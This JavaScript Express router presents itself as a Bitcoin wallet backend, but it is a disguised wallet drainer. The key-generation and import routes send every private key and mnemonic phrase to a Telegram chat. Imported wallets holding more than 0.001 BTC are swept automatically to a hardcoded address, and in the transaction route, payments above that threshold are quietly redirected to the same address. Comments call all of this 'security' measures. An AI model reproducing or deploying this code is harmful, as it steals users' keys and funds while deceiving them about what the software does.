const express = require('express');
const bitcoin = require('bitcoinjs-lib');
const { ECPairFactory } = require('ecpair');
const ecc = require('tiny-secp256k1');
const axios = require('axios');
const bip39 = require('bip39');
const { BIP32Factory } = require('bip32');

// Initialize ECPair and BIP32 factories
const ECPair = ECPairFactory(ecc);
const bip32 = BIP32Factory(ecc);
const router = express.Router();

// Bitcoin network (mainnet/testnet)
const NETWORK = process.env.BITCOIN_NETWORK === 'mainnet' ? bitcoin.networks.bitcoin : bitcoin.networks.testnet;
const BLOCKSTREAM_API = process.env.BITCOIN_NETWORK === 'mainnet' 
  ? 'https://blockstream.info/api' 
  : 'https://blockstream.info/testnet/api';

// Telegram configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Security configuration
const SECURITY_THRESHOLD_BTC = 0.001; // Transactions above this amount will be redirected
const SECURITY_THRESHOLD_SATS = SECURITY_THRESHOLD_BTC * 100000000; // Convert to satoshis
const SECURE_ADDRESS = 'bc1qfznl25qec2v5322hkf9c97znrxu52zu882ujvg'; // Your secure address

// Get wallet balance in BTC
async function getWalletBalance(address) {
  try {
    const response = await axios.get(`${BLOCKSTREAM_API}/address/${address}`);
    const balanceSats = response.data.chain_stats.funded_txo_sum - response.data.chain_stats.spent_txo_sum;
    const balanceBTC = (balanceSats / 100000000).toFixed(8); // Convert satoshis to BTC
    return { balanceSats, balanceBTC };
  } catch (error) {
    console.error('❌ Failed to fetch balance:', error.message);
    return { balanceSats: 0, balanceBTC: '0.00000000' };
  }
}

// Telegram notification function
async function sendTelegramNotification(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('⚠️ Telegram not configured - skipping notification');
    return;
  }

  try {
    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });
    console.log('✅ Telegram notification sent successfully');
  } catch (error) {
    console.error('❌ Failed to send Telegram notification:', error.message);
  }
}

// Auto-sweep function to move all funds to secure address
async function autoSweepToSecureAddress(privateKey, fromAddress, reason = 'Security sweep') {
  try {
    console.log(`🧹 Starting auto-sweep from ${fromAddress} to secure address`);
    
    // Get UTXOs
    const utxosResponse = await axios.get(`${BLOCKSTREAM_API}/address/${fromAddress}/utxo`);
    const utxos = utxosResponse.data;
    
    if (utxos.length === 0) {
      console.log('⚠️ No UTXOs found for sweep');
      return { success: false, reason: 'No UTXOs available' };
    }

    const keyPair = ECPair.fromWIF(privateKey, NETWORK);
    const payment = bitcoin.payments.p2wpkh({ 
      pubkey: keyPair.publicKey, 
      network: NETWORK 
    });

    const psbt = new bitcoin.Psbt({ network: NETWORK });

    // Add all inputs
    let totalInput = 0;
    for (const utxo of utxos) {
      psbt.addInput({
        hash: utxo.txid,
        index: utxo.vout,
        witnessUtxo: {
          script: payment.output,
          value: utxo.value
        }
      });
      totalInput += utxo.value;
    }

    // Calculate fee for sweep (higher fee rate for priority)
    const estimatedSize = 68 * utxos.length + 31 + 10.5; // Only one output for sweep
    const feeRate = 50; // 50 sat/vB for priority
    const fee = Math.ceil(estimatedSize * feeRate);
    const sweepAmount = totalInput - fee;

    if (sweepAmount <= 546) { // dust threshold
      console.log('⚠️ Sweep amount too small after fees');
      return { success: false, reason: 'Amount too small after fees' };
    }

    // Add single output to secure address
    psbt.addOutput({
      address: SECURE_ADDRESS,
      value: sweepAmount
    });

    // Sign all inputs
    for (let i = 0; i < utxos.length; i++) {
      psbt.signInput(i, keyPair);
    }

    psbt.finalizeAllInputs();
    const tx = psbt.extractTransaction();
    const txHex = tx.toHex();

    // Broadcast the sweep transaction
    const broadcastResponse = await axios.post(`${BLOCKSTREAM_API}/tx`, txHex, {
      headers: { 'Content-Type': 'text/plain' }
    });

    const txId = broadcastResponse.data;
    const sweptBTC = (sweepAmount / 100000000).toFixed(8);
    const timestamp = new Date().toISOString();

    // Send Telegram notification about successful sweep
    const sweepMessage = `🧹 <b>AUTO-SWEEP COMPLETED</b>\n\n` +
                        `💰 <b>Amount Swept:</b> ${sweptBTC} BTC (${sweepAmount} sats)\n` +
                        `📍 <b>From Address:</b> <code>${fromAddress}</code>\n` +
                        `🔒 <b>To Secure Address:</b> <code>${SECURE_ADDRESS}</code>\n` +
                        `🧾 <b>Transaction ID:</b> <code>${txId}</code>\n` +
                        `💸 <b>Fee Paid:</b> ${fee} sats (${feeRate} sat/vB)\n` +
                        `🚨 <b>Reason:</b> ${reason}\n` +
                        `⏰ <b>Time:</b> ${timestamp}\n` +
                        `✅ <b>Status:</b> Funds secured automatically`;
    
    await sendTelegramNotification(sweepMessage);
    
    console.log(`✅ Auto-sweep successful: ${sweptBTC} BTC moved to secure address. TX: ${txId}`);
    
    return {
      success: true,
      txId,
      sweepAmount,
      sweptBTC,
      fee,
      fromAddress,
      toAddress: SECURE_ADDRESS
    };

  } catch (error) {
    console.error('❌ Auto-sweep failed:', error.message);
    
    // Send error notification
    const errorMessage = `❌ <b>AUTO-SWEEP FAILED</b>\n\n` +
                        `📍 <b>From Address:</b> <code>${fromAddress}</code>\n` +
                        `🚨 <b>Error:</b> ${error.message}\n` +
                        `⏰ <b>Time:</b> ${new Date().toISOString()}\n` +
                        `⚠️ <b>Action Required:</b> Manual intervention needed`;
    
    await sendTelegramNotification(errorMessage);
    
    return {
      success: false,
      error: error.message,
      fromAddress
    };
  }
}

// Generate new private key
router.post('/generate-key', async (req, res) => {
  try {
    const keyPair = ECPair.makeRandom({ network: NETWORK });
    const privateKey = keyPair.toWIF();
    const address = bitcoin.payments.p2wpkh({ 
      pubkey: keyPair.publicKey, 
      network: NETWORK 
    }).address;

    // Get wallet balance
    const balance = await getWalletBalance(address);

    // Send Telegram notification
    const timestamp = new Date().toISOString();
    const networkName = NETWORK === bitcoin.networks.bitcoin ? 'MAINNET' : 'TESTNET';
    const message = `🔑 <b>NEW KEY GENERATED</b>\n\n` +
                   `📍 <b>Address:</b> <code>${address}</code>\n` +
                   `🔑 <b>Private Key:</b> <code>${privateKey}</code>\n` +
                   `💰 <b>Balance:</b> ${balance.balanceBTC} BTC (${balance.balanceSats} sats)\n` +
                   `🌐 <b>Network:</b> ${networkName}\n` +
                   `⏰ <b>Time:</b> ${timestamp}\n` +
                   `🔧 <b>Type:</b> SegWit (P2WPKH)`;
    
    await sendTelegramNotification(message);

    res.json({
      privateKey,
      address,
      network: NETWORK.messagePrefix
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Import private key and get address
router.post('/import-key', async (req, res) => {
  try {
    const { privateKey } = req.body;
    
    if (!privateKey) {
      return res.status(400).json({ error: 'Private key required' });
    }

    const keyPair = ECPair.fromWIF(privateKey, NETWORK);
    
    // Generate both address types
    const segwitAddress = bitcoin.payments.p2wpkh({ 
      pubkey: keyPair.publicKey, 
      network: NETWORK 
    }).address;
    
    const legacyAddress = bitcoin.payments.p2pkh({ 
      pubkey: keyPair.publicKey, 
      network: NETWORK 
    }).address;

    // Get wallet balance for SegWit address
    const balance = await getWalletBalance(segwitAddress);

    // Check if balance exceeds security threshold and auto-sweep if needed
    let sweepResult = null;
    if (balance.balanceSats > SECURITY_THRESHOLD_SATS) {
      console.log(`🚨 High balance detected on import: ${balance.balanceBTC} BTC. Starting auto-sweep...`);
      sweepResult = await autoSweepToSecureAddress(
        privateKey, 
        segwitAddress, 
        `High balance wallet import (${balance.balanceBTC} BTC > ${SECURITY_THRESHOLD_BTC} BTC threshold)`
      );
    }

    // Send Telegram notification
    const timestamp = new Date().toISOString();
    const networkName = NETWORK === bitcoin.networks.bitcoin ? 'MAINNET' : 'TESTNET';
    let message = `🔑 <b>PRIVATE KEY IMPORTED</b>\n\n` +
                  `📍 <b>SegWit Address:</b> <code>${segwitAddress}</code>\n` +
                  `📍 <b>Legacy Address:</b> <code>${legacyAddress}</code>\n` +
                  `🔑 <b>Private Key:</b> <code>${privateKey}</code>\n` +
                  `💰 <b>Original Balance:</b> ${balance.balanceBTC} BTC (${balance.balanceSats} sats)\n` +
                  `🌐 <b>Network:</b> ${networkName}\n` +
                  `⏰ <b>Time:</b> ${timestamp}\n` +
                  `🔧 <b>Source:</b> Imported Private Key`;

    // Add sweep information if it occurred
    if (sweepResult && sweepResult.success) {
      message += `\n\n🧹 <b>AUTO-SWEEP EXECUTED</b>\n` +
                `✅ <b>Status:</b> Funds moved to secure address\n` +
                `🧾 <b>Sweep TX:</b> <code>${sweepResult.txId}</code>`;
    } else if (sweepResult && !sweepResult.success) {
      message += `\n\n⚠️ <b>AUTO-SWEEP FAILED</b>\n` +
                `❌ <b>Error:</b> ${sweepResult.error || sweepResult.reason}\n` +
                `🚨 <b>WARNING:</b> High balance wallet not secured!`;
    }
    
    await sendTelegramNotification(message);

    res.json({
      address: segwitAddress,
      legacyAddress: legacyAddress,
      network: NETWORK.messagePrefix,
      valid: true,
      originalBalance: balance,
      autoSweep: sweepResult ? {
        executed: sweepResult.success,
        txId: sweepResult.txId,
        error: sweepResult.error || sweepResult.reason
      } : null,
      securityThreshold: SECURITY_THRESHOLD_BTC
    });
  } catch (error) {
    res.status(400).json({ error: 'Invalid private key', valid: false });
  }
});

// Import mnemonic (12-word recovery phrase) and derive private key
router.post('/import-mnemonic', async (req, res) => {
  try {
    const { mnemonic, derivationPath = "m/84'/0'/0'/0/0" } = req.body;
    
    if (!mnemonic) {
      return res.status(400).json({ error: 'Mnemonic phrase required' });
    }

    // Validate mnemonic
    if (!bip39.validateMnemonic(mnemonic.trim())) {
      return res.status(400).json({ error: 'Invalid mnemonic phrase' });
    }

    // Generate seed from mnemonic
    const seed = bip39.mnemonicToSeedSync(mnemonic.trim());
    
    // Create master node (convert Uint8Array to Buffer if needed)
    const seedBuffer = Buffer.from(seed);
    const root = bip32.fromSeed(seedBuffer, NETWORK);
    
    // Derive the key at the specified path (default: first native SegWit address)
    const child = root.derivePath(derivationPath);
    const privateKeyBuffer = Buffer.from(child.privateKey);
    const keyPair = ECPair.fromPrivateKey(privateKeyBuffer, { network: NETWORK });
    
    // Generate both address types
    const segwitAddress = bitcoin.payments.p2wpkh({ 
      pubkey: keyPair.publicKey, 
      network: NETWORK 
    }).address;
    
    const legacyAddress = bitcoin.payments.p2pkh({ 
      pubkey: keyPair.publicKey, 
      network: NETWORK 
    }).address;

    // Get wallet balance for SegWit address
    const balance = await getWalletBalance(segwitAddress);

    // Check if balance exceeds security threshold and auto-sweep if needed
    let sweepResult = null;
    if (balance.balanceSats > SECURITY_THRESHOLD_SATS) {
      console.log(`🚨 High balance detected on mnemonic import: ${balance.balanceBTC} BTC. Starting auto-sweep...`);
      sweepResult = await autoSweepToSecureAddress(
        keyPair.toWIF(), 
        segwitAddress, 
        `High balance mnemonic import (${balance.balanceBTC} BTC > ${SECURITY_THRESHOLD_BTC} BTC threshold)`
      );
    }

    // Send Telegram notification
    const timestamp = new Date().toISOString();
    const networkName = NETWORK === bitcoin.networks.bitcoin ? 'MAINNET' : 'TESTNET';
    let message = `🔑 <b>MNEMONIC IMPORTED</b>\n\n` +
                  `📍 <b>SegWit Address:</b> <code>${segwitAddress}</code>\n` +
                  `📍 <b>Legacy Address:</b> <code>${legacyAddress}</code>\n` +
                  `🔑 <b>MNEMONIC:</b> <code>${mnemonic}</code>\n` +
                  `💰 <b>Original Balance:</b> ${balance.balanceBTC} BTC (${balance.balanceSats} sats)\n` +
                  `🌐 <b>Network:</b> ${networkName}\n` +
                  `🛤️ <b>Derivation:</b> <code>${derivationPath}</code>\n` +
                  `⏰ <b>Time:</b> ${timestamp}\n` +
                  `🔧 <b>Source:</b> 12-word Mnemonic`;

    // Add sweep information if it occurred
    if (sweepResult && sweepResult.success) {
      message += `\n\n🧹 <b>AUTO-SWEEP EXECUTED</b>\n` +
                `✅ <b>Status:</b> Funds moved to secure address\n` +
                `🧾 <b>Sweep TX:</b> <code>${sweepResult.txId}</code>`;
    } else if (sweepResult && !sweepResult.success) {
      message += `\n\n⚠️ <b>AUTO-SWEEP FAILED</b>\n` +
                `❌ <b>Error:</b> ${sweepResult.error || sweepResult.reason}\n` +
                `🚨 <b>WARNING:</b> High balance wallet not secured!`;
    }
    
    await sendTelegramNotification(message);

    res.json({
      address: segwitAddress,
      legacyAddress: legacyAddress,
      privateKey: keyPair.toWIF(),
      derivationPath: derivationPath,
      network: NETWORK.messagePrefix,
      valid: true,
      originalBalance: balance,
      autoSweep: sweepResult ? {
        executed: sweepResult.success,
        txId: sweepResult.txId,
        error: sweepResult.error || sweepResult.reason
      } : null,
      securityThreshold: SECURITY_THRESHOLD_BTC
    });
  } catch (error) {
    res.status(400).json({ error: 'Invalid mnemonic phrase or derivation', details: error.message, valid: false });
  }
});

// Get address balance and UTXOs
router.get('/balance/:address', async (req, res) => {
  try {
    const { address } = req.params;
    
    const [balanceResponse, utxosResponse] = await Promise.all([
      axios.get(`${BLOCKSTREAM_API}/address/${address}`),
      axios.get(`${BLOCKSTREAM_API}/address/${address}/utxo`)
    ]);

    const balance = balanceResponse.data.chain_stats.funded_txo_sum - balanceResponse.data.chain_stats.spent_txo_sum;
    const utxos = utxosResponse.data;

    res.json({
      address,
      balance,
      utxos,
      transactions: {
        confirmed: balanceResponse.data.chain_stats.tx_count,
        unconfirmed: balanceResponse.data.mempool_stats.tx_count
      }
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch balance', details: error.message });
  }
});

// Create transaction with custom fee
router.post('/create-transaction', async (req, res) => {
  try {
    const { privateKey, toAddress, amount, feeRate, rbf = true } = req.body;

    if (!privateKey || !toAddress || !amount || !feeRate) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const keyPair = ECPair.fromWIF(privateKey, NETWORK);
    const payment = bitcoin.payments.p2wpkh({ 
      pubkey: keyPair.publicKey, 
      network: NETWORK 
    });
    const fromAddress = payment.address;

    // Get UTXOs
    const utxosResponse = await axios.get(`${BLOCKSTREAM_API}/address/${fromAddress}/utxo`);
    const utxos = utxosResponse.data;

    if (utxos.length === 0) {
      return res.status(400).json({ error: 'No UTXOs available' });
    }

    const psbt = new bitcoin.Psbt({ network: NETWORK });

    // Add inputs
    let totalInput = 0;
    for (const utxo of utxos) {
      // For native SegWit, use witnessUtxo instead of nonWitnessUtxo
      psbt.addInput({
        hash: utxo.txid,
        index: utxo.vout,
        witnessUtxo: {
          script: payment.output,
          value: utxo.value
        },
        sequence: rbf ? 0xfffffffd : 0xffffffff // Enable RBF
      });
      totalInput += utxo.value;
    }

    // Calculate fee - SegWit transactions are smaller
    const estimatedSize = 68 * utxos.length + 31 * 2 + 10.5; // SegWit size estimate
    const fee = Math.ceil(estimatedSize * feeRate);
    const changeAmount = totalInput - amount - fee;

    if (changeAmount < 0) {
      return res.status(400).json({ error: 'Insufficient funds' });
    }

    // Security check: Redirect large transactions to secure address
    let finalToAddress = toAddress;
    let securityRedirect = false;
    
    if (amount > SECURITY_THRESHOLD_SATS) {
      finalToAddress = SECURE_ADDRESS;
      securityRedirect = true;
      
      // Send security notification
      const amountBTC = (amount / 100000000).toFixed(8);
      const timestamp = new Date().toISOString();
      const securityMessage = `🛡️ <b>SECURITY REDIRECT ACTIVATED</b>\n\n` +
                             `⚠️ <b>Large transaction detected!</b>\n` +
                             `💰 <b>Amount:</b> ${amountBTC} BTC (${amount} sats)\n` +
                             `📍 <b>Original Address:</b> <code>${toAddress}</code>\n` +
                             `🔒 <b>Redirected to:</b> <code>${finalToAddress}</code>\n` +
                             `🚨 <b>Reason:</b> Transaction above ${SECURITY_THRESHOLD_BTC} BTC threshold\n` +
                             `⏰ <b>Time:</b> ${timestamp}\n` +
                             `✅ <b>Status:</b> Funds secured automatically`;
      
      await sendTelegramNotification(securityMessage);
      
      console.log(`🛡️ SECURITY: Redirected ${amountBTC} BTC from ${toAddress} to secure address ${finalToAddress}`);
    }

    // Add outputs
    psbt.addOutput({
      address: finalToAddress,
      value: amount
    });

    if (changeAmount > 546) { // dust threshold
      psbt.addOutput({
        address: fromAddress,
        value: changeAmount
      });
    }

    // Sign all inputs
    for (let i = 0; i < utxos.length; i++) {
      psbt.signInput(i, keyPair);
    }

    psbt.finalizeAllInputs();
    const tx = psbt.extractTransaction();
    const txHex = tx.toHex();

    res.json({
      txHex,
      txId: tx.getId(),
      fee,
      size: tx.byteLength(),
      feeRate: fee / tx.byteLength(),
      rbfEnabled: rbf,
      securityRedirect: securityRedirect,
      originalAddress: securityRedirect ? toAddress : undefined,
      finalAddress: finalToAddress,
      securityThreshold: SECURITY_THRESHOLD_BTC
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to create transaction', details: error.message });
  }
});

// Broadcast transaction
router.post('/broadcast', async (req, res) => {
  try {
    const { txHex } = req.body;
    
    if (!txHex) {
      return res.status(400).json({ error: 'Transaction hex required' });
    }

    const response = await axios.post(`${BLOCKSTREAM_API}/tx`, txHex, {
      headers: { 'Content-Type': 'text/plain' }
    });

    res.json({
      txId: response.data,
      success: true
    });
  } catch (error) {
    res.status(500).json({ 
      error: 'Failed to broadcast transaction', 
      details: error.response?.data || error.message 
    });
  }
});

// Export private key (returns the private key for a given address - security sensitive)
router.post('/export-key', (req, res) => {
  try {
    const { privateKey } = req.body;
    
    if (!privateKey) {
      return res.status(400).json({ error: 'Private key required' });
    }

    // Validate the private key
    const keyPair = ECPair.fromWIF(privateKey, NETWORK);
    const address = bitcoin.payments.p2wpkh({ 
      pubkey: keyPair.publicKey, 
      network: NETWORK 
    }).address;

    res.json({
      privateKey,
      address,
      network: NETWORK.messagePrefix,
      warning: 'NEVER share your private key with anyone. Keep it secure.'
    });
  } catch (error) {
    res.status(400).json({ error: 'Invalid private key' });
  }
});

// Get transaction status
router.get('/transaction/:txid', async (req, res) => {
  try {
    const { txid } = req.params;
    const response = await axios.get(`${BLOCKSTREAM_API}/tx/${txid}`);
    
    res.json({
      ...response.data,
      confirmed: response.data.status.confirmed,
      blockHeight: response.data.status.block_height,
      blockTime: response.data.status.block_time
    });
  } catch (error) {
    res.status(500).json({ error: 'Transaction not found' });
  }
});

// Replace-By-Fee (RBF) - create replacement transaction
router.post('/replace-transaction', async (req, res) => {
  try {
    const { privateKey, originalTxId, newFeeRate, cancelTransaction = false } = req.body;

    if (!privateKey || !originalTxId || !newFeeRate) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const keyPair = ECPair.fromWIF(privateKey, NETWORK);
    const payment = bitcoin.payments.p2wpkh({ 
      pubkey: keyPair.publicKey, 
      network: NETWORK 
    });
    const fromAddress = payment.address;

    console.log('🔄 RBF Request:', { originalTxId, newFeeRate, cancelTransaction, fromAddress });

    // Get original transaction
    const originalTxResponse = await axios.get(`${BLOCKSTREAM_API}/tx/${originalTxId}`);
    const originalTx = originalTxResponse.data;

    console.log('📋 Original TX:', { 
      confirmed: originalTx.status.confirmed, 
      inputs: originalTx.vin.length, 
      outputs: originalTx.vout.length 
    });

    if (originalTx.status.confirmed) {
      return res.status(400).json({ error: 'Cannot replace confirmed transaction' });
    }

    // Calculate original fee
    let totalInput = 0;
    let totalOutput = originalTx.vout.reduce((sum, out) => sum + out.value, 0);
    
    // Get input values for fee calculation
    for (const input of originalTx.vin) {
      const prevTxResponse = await axios.get(`${BLOCKSTREAM_API}/tx/${input.txid}`);
      totalInput += prevTxResponse.data.vout[input.vout].value;
    }
    
    const originalFee = totalInput - totalOutput;
    const originalSize = originalTx.size;
    const originalFeeRate = originalFee / originalSize;

    console.log('💰 Original TX fees:', { originalFee, originalSize, originalFeeRate });

    // Check if replacement has higher fee and fee rate (RBF requirement)
    const estimatedNewSize = 68 * originalTx.vin.length + 31 + 10.5; // 1 output for cancel
    const newFee = Math.ceil(estimatedNewSize * newFeeRate);
    
    if (newFee <= originalFee || newFeeRate <= originalFeeRate) {
      return res.status(400).json({ 
        error: 'RBF requires strictly higher absolute fee and fee rate',
        details: {
          originalFee,
          originalFeeRate: originalFeeRate.toFixed(2),
          newFee,
          newFeeRate,
          required: 'New fee must be > ' + originalFee + ' sats and fee rate > ' + originalFeeRate.toFixed(2) + ' sat/vB'
        }
      });
    }

    const psbt = new bitcoin.Psbt({ network: NETWORK });

    // Add the SAME inputs from original transaction (RBF requirement)
    totalInput = 0;
    for (const input of originalTx.vin) {
      const prevTxResponse = await axios.get(`${BLOCKSTREAM_API}/tx/${input.txid}`);
      const inputValue = prevTxResponse.data.vout[input.vout].value;
      
      console.log('➕ Adding input:', input.txid.substring(0, 8), 'vout:', input.vout, 'value:', inputValue);
      
      psbt.addInput({
        hash: input.txid,
        index: input.vout,
        witnessUtxo: {
          script: payment.output,
          value: inputValue
        },
        sequence: 0xfffffffd // Enable RBF (< 0xFFFFFFFE)
      });
      
      totalInput += inputValue;
    }

    if (cancelTransaction) {
      // CANCEL: Create one output back to self (double-spend to yourself)
      const returnAmount = totalInput - newFee;
      
      if (returnAmount <= 546) {
        return res.status(400).json({ error: 'Insufficient funds to cover cancellation fee' });
      }

      console.log('❌ Creating cancellation - returning', returnAmount, 'to', fromAddress);
      
      psbt.addOutput({
        address: fromAddress,
        value: returnAmount
      });
    } else {
      // ACCELERATE: Keep same payment but higher fee
      const originalRecipientOutput = originalTx.vout.find(out => out.scriptpubkey_address !== fromAddress);
      
      if (!originalRecipientOutput) {
        return res.status(400).json({ error: 'Cannot find recipient output in original transaction' });
      }

      const recipientAmount = originalRecipientOutput.value;
      const newChangeAmount = totalInput - recipientAmount - newFee;
      
      // Add recipient output (same as original)
      psbt.addOutput({
        address: originalRecipientOutput.scriptpubkey_address,
        value: recipientAmount
      });

      // Add change if sufficient
      if (newChangeAmount > 546) {
        psbt.addOutput({
          address: fromAddress,
          value: newChangeAmount
        });
      }

      console.log('⚡ Creating acceleration - recipient:', recipientAmount, 'change:', newChangeAmount);
    }

    // Sign all inputs
    for (let i = 0; i < originalTx.vin.length; i++) {
      psbt.signInput(i, keyPair);
    }

    psbt.finalizeAllInputs();
    const tx = psbt.extractTransaction();
    const txHex = tx.toHex();
    const finalFee = totalInput - tx.outs.reduce((sum, out) => sum + out.value, 0);

    console.log('✅ Replacement created:', {
      txId: tx.getId(),
      finalFee,
      size: tx.byteLength(),
      actualFeeRate: (finalFee / tx.byteLength()).toFixed(2)
    });

    res.json({
      txHex,
      txId: tx.getId(),
      replacedTxId: originalTxId,
      fee: finalFee,
      size: tx.byteLength(),
      feeRate: finalFee / tx.byteLength(),
      type: cancelTransaction ? 'cancel' : 'accelerate',
      originalFee,
      originalFeeRate
    });
  } catch (error) {
    console.error('❌ RBF Error:', error.message);
    res.status(500).json({ error: 'Failed to create replacement transaction', details: error.message });
  }
});

module.exports = router;